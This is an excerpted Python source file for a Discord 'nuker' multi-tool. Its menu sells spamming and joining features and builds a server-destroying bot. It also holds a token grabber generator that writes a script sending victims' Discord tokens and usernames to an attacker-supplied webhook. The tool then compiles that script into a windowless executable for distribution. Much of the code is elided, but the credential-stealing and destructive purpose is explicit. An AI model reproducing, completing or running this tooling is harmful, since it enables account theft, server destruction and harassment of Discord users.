# Coded / Dev / Owner: *~Nêkøᴹc~*#0642 | https://github.com/Neko-DSCN | https://github.com/Neko-DSCN/Neko-Nuker1
# Neko Discord Nuker / Multi Tool©
# Copyright © 2022 *~Nêkøᴹc~*#0642
# Copyright © Neko-Nuker
#########################################################
...
if __name__ == "__main__":
    ...
    if os.path.basename(sys.argv[0]).endswith("exe"):
        with open(getTempDir()+"\\Neko_proxies", 'w'): pass
        clear()
        proxy_scrape()
        sleep(1)
    try:
        ...
        print(f"{Fore.RED}Your Python Version is Not supported: ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}), Please Download v3.9+ to use Neko-Nuker!")
        sleep(5)
...
def spammer():
    ...
    colorama.init()
    Write.Print(f'{login}', Colors.blue_to_purple,  interval=0.000)
    print('')
    print('')
    ...
    Write.Print(" > Github.com/Neko-DSCN               |__/  \__/ \_______/|__/  \__/ \______/ \n", Colors.blue_to_purple, interval=0.000)
...
#   JOINER
    if choice == '1':
        Spinner()
        gh = input(f"""
Joiner is in the Paid Version of Neko-Nuker!\nIf You Are Wanting to Purchase Make Sure to Checkout the Offical Neko-Nuker Website!
                                   
[\x1b[95m1\x1b[95m\x1B[37m] Neko-Nuker Website
...
#   TOKEN GRABBER
    if choice == '5':
        Spinner()
        print(f"[{r}#{w}] Enter the name you want to give to the final file")
        global filename
        fileName = str(input(f"[{m}-{w}] File Name: "))
        print(f"""\n\n[{r}#{w}] Enter A Vaild Webhook URL! (info gets sent to webhook!)""")
        global webhooklink
        webhooklink = str(input(f"[{m}-{w}] Webhook URL: "))
        print('\n')
...
> :warning: __Token:__\n\t`{tok}`\n
`{pc_username} Has Ran Neko-Nuker Token Grabber!` :smiling_imp:\"""
                        payload = json.dumps({'content': embed, 'username': 'NEKO', 'avatar_url': 'https://media.discordapp.net/attachments/1010833771546812548/1012899446146740374/gangnuker_paid_icon.jpg?width=676&height=676'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
...
if __name__ == '__main__':
    get_token()""".replace("~~WEBHOOK_URL~~", webhooklink))
        ...
        print(f"""\n[{g}-{w}] Correctly Written to "{fileName}.py" """)
        convert = input(f"""[{g}+{w}] Convert your script into an executable (Y/N)?: """)
        if convert.upper() == 'Y' or convert.upper() == 'YES':
            try:
                time.sleep(1)
                clear()

                print(f'[{m}#{w}] Compiling Files...')
                time.sleep(1)
                os.system(f"pyinstaller --onefile --noconsole --clean -i NONE {fileName}.py")
                clear()
                print(f'[{m}#{w}] Deleting Useless Files...')
                time.sleep(1)
                try:
                ...
                clear()
                filegrabbertitle()
                print(f"[{g}+{w}] Token Grabber has been Successfully Created!")
            except:
                clear()
                filegrabbertitle()
                print(f"[{g}+{w}] Token Grabber has been Successfully Created!")
...
#   SERVER NUKER
    if choice == '8':
        Spinner()
#       gang = discord.Client(intents=discord.Intents().all())
        ...
        def main():
            ...
            async def on_ready():
                if len(gang.guilds) > 1:
                    ...
                    guildpl = "guild"
                activity = discord.Game(name=f"NEKO-Nuker Server Nuker", type=3)
...
#   DM SPAMMER (NEED TO FIX!)
    if choice == '10':
        Spinner()
        gh = input(f"""
DM Spammer is in the Paid Version of Neko-Nuker!\nIf You Are Wanting to Purchase Make Sure to Checkout the Offical Neko-Nuker Website!
...
if __name__ == "__main__":
                ...
                if os.path.basename(sys.argv[0]).endswith("exe"):
                    search_for_updates()
                    if not os.path.exists(getTempDir()+"\\Neko_proxies"):
                        proxy_scrape()
                    clear()
                else:
                    search_for_updates()
